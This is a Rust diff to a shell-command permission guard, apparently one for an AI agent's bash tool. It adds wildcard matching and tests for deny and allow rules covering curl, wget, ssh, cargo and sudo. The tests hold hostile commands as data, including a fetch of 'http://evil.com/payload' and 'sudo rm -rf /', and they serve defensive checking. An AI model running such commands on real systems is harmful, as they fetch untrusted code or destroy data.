@@ -195,8 +195,8 @@ pub fn check(command: &str, rules: &[PermissionRule], tool: &str) -> GuardResult
 /// skipped). Rules are evaluated in config-list order (first-match-wins).
 ///
 /// Uses `crate::pattern::rule_matches_tool()` for tool scoping and
-/// `crate::pattern::command_matches_pattern()` for case-insensitive
-/// substring matching.
+/// `crate::pattern::command_matches_wildcard()` for case-insensitive
+/// wildcard matching (`*` matches any sequence of characters).
 pub fn check_command_against_rules(
     command: &str,
     rules: &[PermissionRule],
@@ -213,8 +213,8 @@ pub fn check_command_against_rules(
             continue;
         }
 
-        // Check command matching (case-insensitive substring)
-        if !crate::pattern::command_matches_pattern(command, command_pattern) {
+        // Check command matching with wildcard support
+        if !crate::pattern::command_matches_wildcard(command, command_pattern) {
             continue;
         }
 
@@ -580,6 +580,201 @@ mod tests {
                 assert!(msg.contains("sudo"));
             }
             _ => panic!("expected Deny for SUDO (case-insensitive)"),
+        }
+    }
+
+    // ── Config wildcard rules ─────────────────────────────────────────────
+
+    #[test]
+    fn test_wildcard_curl_deny_matches_curl_url() {
+        // Bash(curl *) should match curl https://example.com
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("curl *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("curl https://example.com", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"), "should deny curl URL: {msg}");
+            }
+            other => panic!("expected Deny for curl * matching curl URL, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_curl_deny_matches_curl_http_url() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("curl *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("curl http://evil.com/payload", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"));
+            }
+            other => panic!("expected Deny for curl http URL, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_curl_deny_does_not_match_non_curl() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("curl *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        // wget should not be caught by curl rule, but falls through
+        // to built-in dangerous patterns which ask for wget
+        let result = check("wget http://example.com", &rules, "bash");
+        match result {
+            GuardResult::Ask(reason) => {
+                assert!(
+                    reason.details.contains("wget"),
+                    "should ask for wget from built-in pattern: {}",
+                    reason.details
+                );
+            }
+            other => panic!("expected Ask for wget (built-in pattern), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_wget_deny_matches_wget_url() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("wget *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("wget http://example.com/payload", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"));
+            }
+            other => panic!("expected Deny for wget URL, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_ssh_deny_matches_ssh_command() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("ssh *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("ssh user@host", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"));
+            }
+            other => panic!("expected Deny for ssh command, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_ssh_deny_does_not_match_echo() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("ssh *".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("echo hello", &rules, "bash");
+        assert_eq!(result, GuardResult::Allow);
+    }
+
+    #[test]
+    fn test_wildcard_bare_asterisk_deny_matches_everything() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("*".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("anything at all", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"));
+            }
+            other => panic!("expected Deny for * matching anything, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_cargo_allow_matches_cargo_subcommands() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("cargo *".into()),
+            operation: None,
+            action: RuleAction::Allow,
+        }];
+        let result = check("cargo build --release", &rules, "bash");
+        assert_eq!(result, GuardResult::Allow);
+    }
+
+    #[test]
+    fn test_wildcard_cargo_allow_does_not_match_other_commands() {
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("cargo *".into()),
+            operation: None,
+            action: RuleAction::Allow,
+        }];
+        // Non-cargo commands should fall through to built-in patterns
+        let result = check("sudo rm -rf /", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("sudo"));
+            }
+            other => panic!("expected Deny for sudo (not matched by cargo rule), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_wildcard_curl_allow_overrides_built_in_ask() {
+        // Bash(curl *) with Allow should bypass the built-in Ask for curl
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("curl *".into()),
+            operation: None,
+            action: RuleAction::Allow,
+        }];
+        let result = check("curl https://example.com", &rules, "bash");
+        assert_eq!(result, GuardResult::Allow);
+    }
+
+    #[test]
+    fn test_wildcard_pattern_without_asterisk_still_works() {
+        // A pattern with no * should still match as substring
+        let rules = vec![PermissionRule {
+            tool_pattern: None,
+            path_pattern: None,
+            command_pattern: Some("rm".into()),
+            operation: None,
+            action: RuleAction::Deny,
+        }];
+        let result = check("rm -rf /", &rules, "bash");
+        match result {
+            GuardResult::Deny(msg) => {
+                assert!(msg.contains("denied"));
+            }
+            other => panic!("expected Deny for rm (no wildcard), got {other:?}"),
         }
     }
 
